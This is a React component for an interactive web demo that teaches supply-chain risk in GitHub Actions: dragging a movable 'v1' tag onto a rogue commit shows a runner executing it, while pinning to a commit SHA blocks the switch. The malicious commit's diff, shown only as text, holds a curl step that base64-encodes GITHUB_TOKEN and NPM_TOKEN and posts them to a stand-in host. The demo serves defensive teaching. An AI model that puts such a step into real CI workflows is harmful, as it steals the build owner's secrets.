"use client";

import { useCallback, useRef, useState } from "react";

/**
 * The attack, playable.
 *
 * The page used to simply assert that a tag is a movable pointer. Nobody
 * changes a workflow because a paragraph told them to. Here you move the tag
 * yourself, onto a commit you can read, and watch the runner execute it.
 */

interface Commit {
  sha: string;
  message: string;
  malicious?: boolean;
  diff: string[];
}

const COMMITS: Commit[] = [
  { sha: "a3f912c", message: "add retry on 429", diff: ["+ retries: 3"] },
  { sha: "7b2e084", message: "bump node to 22", diff: ["- node-version: 20", "+ node-version: 22"] },
  { sha: "e1d47ab", message: "tidy readme", diff: ["+ ## Usage"] },
  {
    sha: "9c8f3d1",
    message: "chore: ci tweak",
    malicious: true,
    diff: [
      "+ - run: |",
      "+     curl -sX POST https://collect.example.sh \\",
      '+       -d "$(printf %s \\"$GITHUB_TOKEN$NPM_TOKEN\\" | base64)"',
    ],
  },
];

const PIN_AT = 1;

export default function TagDemo() {
  const [tagAt, setTagAt] = useState(1);
  const [pinned, setPinned] = useState(false);
  const [nudged, setNudged] = useState(false);
  const railRef = useRef<HTMLDivElement>(null);
  const dragging = useRef(false);

  // What the runner actually pulls. Pinned, the tag is decorative.
  const runningAt = pinned ? PIN_AT : tagAt;
  const running = COMMITS[runningAt];
  const compromised = !pinned && !!running.malicious;

  const moveTo = useCallback((i: number) => {
    setTagAt(Math.max(0, Math.min(COMMITS.length - 1, i)));
    setNudged(true);
  }, []);

  /** Centre of column i, matching the grid the commits are laid out on. */
  const centreOf = (i: number) => ((i + 0.5) / COMMITS.length) * 100;

  const fromPointer = useCallback((clientX: number) => {
    const rail = railRef.current;
    if (!rail) return;
    const r = rail.getBoundingClientRect();
    const frac = (clientX - r.left) / r.width;
    moveTo(Math.floor(frac * COMMITS.length));
  }, [moveTo]);

  return (
    <div className="rounded-2xl border border-edge bg-card p-5 sm:p-6">
      <div className="mb-5 flex flex-wrap items-center justify-between gap-3">
        <div>
          <div className="label text-muted">the action you depend on</div>
          <code className="mono mt-1 block text-[14px] text-fg">
            uses: some-vendor/deploy@
            <span style={{ color: pinned ? "var(--ok)" : "var(--crit)" }}>
              {pinned ? COMMITS[PIN_AT].sha : "v1"}
            </span>
          </code>
        </div>

        <button
          onClick={() => { setPinned((p) => !p); setNudged(false); }}
          aria-pressed={pinned}
          className="mono rounded-lg border px-3.5 py-2 text-[12.5px] transition-colors"
          style={{
            borderColor: pinned ? "var(--ok)" : "var(--edge)",
            background: pinned ? "color-mix(in srgb, var(--ok) 12%, transparent)" : "var(--surface)",
            color: pinned ? "var(--ok)" : "var(--fg)",
          }}
        >
          {pinned ? "pinned to a commit" : "pin it to a commit"}
        </button>
      </div>

      {/* The rail */}
      <div className="mb-2 flex items-baseline justify-between">
        <span className="label text-muted">their repository</span>
        <span className="mono text-[11px] text-muted">drag the tag, or click a commit</span>
      </div>

      <div
        ref={railRef}
        className="relative select-none pb-2 pt-9"
        onPointerDown={(e) => { dragging.current = true; (e.target as Element).setPointerCapture?.(e.pointerId); fromPointer(e.clientX); }}
        onPointerMove={(e) => { if (dragging.current) fromPointer(e.clientX); }}
        onPointerUp={() => { dragging.current = false; }}
        onPointerCancel={() => { dragging.current = false; }}
        style={{ touchAction: "pan-y" }}
      >
        {/* the tag chip, floating above whichever commit it points at */}
        <div
          className="pointer-events-none absolute top-0 transition-[left] duration-200 ease-out"
          style={{ left: `${centreOf(tagAt)}%`, transform: "translateX(-50%)" }}
        >
          <div
            className="mono flex items-center gap-1.5 rounded-md px-2.5 py-1 text-[11.5px] font-semibold shadow-sm"
            style={{
              background: pinned ? "var(--surface)" : "color-mix(in srgb, var(--crit) 16%, var(--card))",
              border: `1px solid ${pinned ? "var(--edge)" : "var(--crit)"}`,
              color: pinned ? "var(--muted)" : "var(--crit)",
              opacity: pinned ? 0.55 : 1,
            }}
          >
            v1 {pinned ? "(ignored)" : "↓"}
          </div>
        </div>

        <div className="relative h-[3px] rounded-full" style={{ background: "var(--edge)" }} />

        <div className="mt-3 grid" style={{ gridTemplateColumns: `repeat(${COMMITS.length}, 1fr)` }}>
          {COMMITS.map((c, i) => {
            const isTag = i === tagAt;
            const isRun = i === runningAt;
            return (
              <button
                key={c.sha}
                onClick={() => moveTo(i)}
                className="flex cursor-pointer flex-col items-center gap-1.5 px-1 text-center"
              >
                <span
                  className="h-3 w-3 rounded-full transition-all"
                  style={{
                    background: isRun ? (c.malicious && !pinned ? "var(--crit)" : "var(--ok)") : "var(--edge)",
                    boxShadow: isRun ? `0 0 0 4px color-mix(in srgb, ${c.malicious && !pinned ? "var(--crit)" : "var(--ok)"} 22%, transparent)` : "none",
                    transform: isTag ? "scale(1.25)" : "none",
                  }}
                />
                <code className="mono text-[11px]" style={{ color: isRun ? "var(--fg)" : "var(--muted)" }}>{c.sha}</code>
                <span className="text-[11px] leading-tight text-muted">{c.message}</span>
              </button>
            );
          })}
        </div>
      </div>

      {/* The runner */}
      <div className="mt-5 overflow-hidden rounded-xl shadow-sm"
        style={{ background: "#010409", border: "1px solid #30363d" }}>
        <div className="flex items-center gap-2 border-b px-4 py-2" style={{ borderColor: "#30363d" }}>
          <span className="h-2 w-2 rounded-full" style={{ background: compromised ? "#f85149" : "#3fb950" }} />
          <span className="mono text-[11px]" style={{ color: "#8b949e" }}>your runner · build #1482</span>
        </div>

        <pre className="mono overflow-x-auto px-4 py-3.5 text-[12px] leading-[1.75]" style={{ color: "#c9d1d9", margin: 0 }}>
{`$ uses: some-vendor/deploy@${pinned ? COMMITS[PIN_AT].sha : "v1"}`}
          <br />
          <span style={{ color: "#8b949e" }}>
            {pinned
              ? `  ▸ ${COMMITS[PIN_AT].sha} — immutable, no lookup needed`
              : `  ▸ resolving v1 → ${running.sha}`}
          </span>
          <br />
          <span style={{ color: "#8b949e" }}>{`  ▸ ${running.message}`}</span>
          <br />
          {running.diff.map((l) => (
            <span key={l} style={{ color: compromised ? "#ffa198" : "#7ee787" }}>{`  ${l}\n`}</span>
          ))}
          <span style={{ color: compromised ? "#f85149" : "#3fb950" }}>
            {compromised ? "  ✗ POST 200 — 2 secrets left this runner" : "  ✓ completed in 1.2s"}
          </span>
        </pre>
      </div>

      {/* The point */}
      <p className="mt-4 text-[13.5px] leading-[1.65]" style={{ color: compromised ? "var(--crit)" : "var(--muted)" }}>
        {compromised ? (
          <>
            They moved <code className="mono">v1</code> onto a commit you never reviewed, and your
            next build ran it with your secrets. No exploit, no CVE — a tag is a pointer, and they
            own it.
          </>
        ) : pinned ? (
          nudged ? (
            <>The tag moved and nothing happened. That is the entire fix — a commit SHA has no pointer to repoint.</>
          ) : (
            <>Now try moving the tag. The runner will not follow it.</>
          )
        ) : (
          <>Drag <code className="mono">v1</code> onto the last commit and watch the runner.</>
        )}
      </p>
    </div>
  );
}
